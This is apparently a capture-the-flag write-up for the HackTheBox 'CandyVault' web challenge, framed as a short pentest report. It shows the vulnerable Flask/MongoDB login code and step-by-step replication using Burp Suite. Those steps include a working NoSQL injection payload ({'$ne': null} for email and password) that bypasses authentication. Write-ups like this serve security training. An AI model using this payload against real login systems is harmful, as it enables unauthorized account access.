### CandyVault Web Challange HTB 

## Executive Summary 

Our testing indicates that the overall security of CandyVault.com requires significant improvement. We identified a critical NoSQL Injection vulnerability in the login functionality, which allowed us to bypass authentication. The main attack vector utilized a NoSQL Injection payload sent via a proxy tool (Burp Suite). This vulnerability exists because the login logic does not properly validate user input, allowing queries to match any document where the email and password fields are not null rather than being valid. 

```
@app.route("/login", methods=["POST"])
def login():
    content_type = request.headers.get("Content-Type")

    if content_type == "application/x-www-form-urlencoded":
        email = request.form.get("email")
        password = request.form.get("password")

    elif content_type == "application/json":
        data = request.get_json()
        email = data.get("email")
        password = data.get("password")
    
    else:
        return jsonify({"error": "Unsupported Content-Type"}), 400

    user = users_collection.find_one({"email": email, "password": password})

    if user:
        return render_template("candy.html", flag=open("flag.txt").read())
    else:
        return redirect("/")

```

As we can see from the above the ```user = users_collection.find_one({"email": email, "password": password})``` this just needs the fields to exist in database.


Replication steps 

Intercept the /login POST request using Burp suite 

Change Content-Type to application/json.

> We know from files the website uses MongoDB so simple google and find statement that search for email and password that is not null 


Replace the body with payload:

{
  "email": {"$ne": null},
  "password": {"$ne": null}
}


Forward the request.



